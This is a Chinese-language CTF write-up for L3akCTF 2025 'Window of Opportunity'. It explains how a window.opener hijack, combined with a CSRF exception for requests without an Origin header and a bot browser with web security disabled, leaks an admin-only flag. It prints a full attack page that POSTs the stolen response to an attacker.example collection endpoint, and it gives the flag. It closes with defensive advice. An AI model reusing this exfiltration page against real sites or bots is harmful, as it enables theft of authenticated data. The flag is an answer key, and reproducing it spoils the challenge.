# L3akCTF 2025 Window of Opportunity Writeup

## 题目简述

题目提供一个 URL 举报页面。普通用户提交外部页面后，Puppeteer bot 会先在挑战站点设置带有 `admin: true` 的 JWT cookie，再从挑战首页通过 `window.open(url, "_blank")` 打开该页面。

`/get_flag` 有 Origin、CSRF token 和管理员 JWT 检查，但新窗口保留了 `window.opener`，而 bot 又关闭了浏览器同源策略。决定性障碍是利用 opener 导航把无 Origin 的顶层请求放进管理员上下文，本文按 Web 归档。

## 解题过程

### 分析 get_flag 的特殊分支

CSRF 中间件对 `/get_flag` 有一条例外：

```javascript
if (req.path === "/get_flag") {
  if (!req.headers.origin) {
    return next();
  }
}
```

跨源 `fetch` 会带攻击者 Origin，因而被拒绝；但把一个窗口导航到 `/get_flag` 属于顶层 GET，通常不带 `Origin`，可以直接跳过后续 CSRF token 校验。

该 endpoint 仍要求管理员 cookie：

```javascript
const decoded = jwt.verify(req.cookies.token, COOKIE_SECRET);
if (decoded.admin === true) {
  return res.json({flag: FLAG});
}
```

bot 已经把这个 cookie 设置到比赛站点，且 `SameSite=Lax` 允许跨站发起的顶层导航携带它。

### 劫持 opener 的导航

bot 从挑战首页执行：

```javascript
window.open(targetUrl, "_blank");
```

没有传入 `noopener`，响应也没有 `Cross-Origin-Opener-Policy`，所以攻击者页面中的 `window.opener` 指向管理员首页。跨源页面即使不能读取 opener，也可以给其 `location` 赋值：

```javascript
window.opener.location = CHALLENGE_ORIGIN + "/get_flag";
```

这里必须使用管理员 JWT cookie 实际所属的挑战 origin。仓库官方示例写成 `127.0.0.1:3000`，只适合 cookie 同样绑定到 loopback 的本地部署；公开部署应使用 bot 设置 cookie 时采用的公开挑战 origin，否则请求不会携带 token。

### 读取响应并外带

正常浏览器的同源策略会阻止攻击者页面读取导航后的 opener 内容，但题目启动 Chromium 时包含：

```text
--disable-web-security
--disable-features=IsolateOrigins,site-per-process
--disable-site-isolation-trials
```

因此在短暂等待后可以读取 JSON 响应。完整攻击页面可写为：

```html
<!doctype html>
<meta charset="utf-8">
<script>
const challenge = "http://challenge-origin";
const collect = "https://attacker.example/collect";

if (window.opener) {
  window.opener.location = challenge + "/get_flag";

  setTimeout(() => {
    const body = window.opener.document.body.innerText;
    fetch(collect, {
      method: "POST",
      mode: "no-cors",
      body
    });
  }, 200);
}
</script>
```

将页面放在攻击者控制的 HTTP 服务上，通过正常首页取得自己的 CSRF token，再提交其 URL 给 `/visit_url`。bot 打开页面后只等待约 1 秒便关闭整个 browser context，所以导航和外带都应尽快完成。

接收端获得的 JSON 中包含：

```text
L3AK{T1gh7_CSRF_y3t_w1nd0w_0p3n3r_w1n5!}
```

外部收集地址仅承担记录 POST body 的作用，任意自建日志端点都可替代，不需要依赖特定 webhook 服务。

## 方法总结

CSRF 防护不能只根据 `Origin` 是否缺失决定放行，因为顶层导航本来就可能没有该请求头。敏感 GET endpoint 也不应产生状态或返回可被导航读取的秘密；管理员身份校验与 CSRF token 应同时成立。

打开不可信 URL 时必须设置 `noopener,noreferrer`，并可配合 `Cross-Origin-Opener-Policy` 切断反向窗口引用。题目中的 `--disable-web-security` 又把原本“只能导航、不能读取”的 opener 能力升级为直接读回 flag；自动化 bot 不应以关闭浏览器核心隔离机制的方式简化部署。
